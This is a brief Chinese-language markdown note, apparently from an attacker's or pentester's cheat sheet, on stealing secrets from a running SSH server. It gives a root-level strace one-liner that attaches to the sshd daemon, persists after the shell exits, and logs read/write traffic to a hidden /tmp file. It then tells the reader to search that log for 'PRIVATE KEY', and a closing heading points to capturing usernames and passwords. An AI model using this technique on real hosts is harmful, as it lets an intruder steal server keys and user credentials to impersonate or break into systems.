### 获取sshd进程私钥

1.root权限执行

```bash
# 使用括号执行程序，当前shell退出，执行的程序不会退出
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 4096 2> /tmp/.sshd.log &)

```

2.查找私钥直接搜索字符串`PRIVATE KEY`

# 查找用户名和密码
